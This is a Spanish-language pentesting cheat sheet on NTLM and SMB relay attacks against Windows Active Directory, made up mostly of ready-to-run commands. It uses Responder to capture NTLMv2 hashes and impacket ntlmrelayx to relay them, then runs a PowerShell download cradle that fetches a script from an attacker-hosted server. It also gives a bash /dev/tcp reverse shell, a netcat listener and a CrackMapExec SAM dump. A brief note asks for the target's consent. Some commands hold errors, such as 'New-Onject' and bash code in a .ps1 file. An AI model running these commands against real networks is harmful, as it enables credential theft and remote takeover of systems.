
# NTLM/SMB Relay

Pilla todos los hashes NTLM de unos objetivos o IPs concretas dentro de una organización

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">NTLM Relay</mark>

La técnica de NTLM Relay aprovecha la debilidad del protocolo de autenticación NTLM utilizado por los sistemas de Windows. En un ataque de NTLM Relay, un atacante intercepta una solicitud de autenticación de un usuario en el entorno de Active Directory y la reenvía a otro sistema o aplicación en la red. Si el sistema o aplicación de destino no requiere autenticación fuerte, el atacante puede usar las credenciales del usuario interceptadas para obtener acceso no autorizado al sistema o aplicación de destino.

### Con ntlmrelayx

Es un módulo de impacket para NTLM Relay

{% embed url="<https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py>" %}

```
responder -I eth0 -rdw
ntlmrelayx.py -tf targets.txt -smb2support
```

### Con impacket&#x20;

```
impacket-ntlmrelayx -smb2support -tf targets.txt
```

### Proxy

* Usar el flag -socks para añadir un proxy

```
impacket-ntlmrelayx -smb2support -tf targets.txt -socks
```

* Configurar proxy:&#x20;

```
sudo nano etc/proxychains4.conf 
cambiar puerto a 1080
```

### Ejecutar comando al conectar a un host

* Abrir un servidor con `python2 -m SimpleHTTPServer` con una reverse shell one liner y dejar en escucha

{% code title="shell.ps1" %}

```bash
cmd -i >& /dev/tcp/0.0.0.0/5555 0>&1
```

{% endcode %}

```bash
python2 -m SimpleHTTPServer
```

{% code overflow="wrap" %}

```php
impacket-ntlmrelayx -smb2support -tf targets.txt -c "powershell -c \"IEX(New-Onject System.Net.WebClient).DownloadString('http://IP-KALI:8000/shell.ps1')\""
```

{% endcode %}

```bash
netcat -lvp 5555 # (O el puerto que hayamos puesto en la reverse shell)
```

```bash
sudo responder -I eth0 -dw
```

## <mark style="color:purple;">SMB Relay</mark>

La técnica de SMB Relay es similar a la técnica de NTLM Relay, pero se utiliza específicamente para atacar el protocolo de intercambio de archivos de servidor SMB en sistemas de Windows. En un ataque de SMB Relay, un atacante intercepta una solicitud de conexión SMB de un usuario y la reenvía a otro sistema o aplicación en la red. Si el sistema o aplicación de destino no requiere autenticación fuerte, el atacante puede utilizar las credenciales del usuario interceptadas para obtener acceso no autorizado al sistema o aplicación de destino a través de SMB.

Pilla <mark style="color:purple;">todos los hash NTLM V.2</mark> de los usuarios del dominio. Ejecutar y dejarlo un tiempo en escucha.

{% code title="En Kali Linux" %}

```
responder -I eth0 -rdw
```

{% endcode %}

### Detectar equipos potenciales para SMB Relay con CrackMapExec

```php
crackmapexec smb 192.168.94.0/24 # IP de nuestra red terminada en 0.24

proxychains4 crackmapexec smb IP-DC -u 'Administrador' -d 'corp' -p '12345' --sam
```
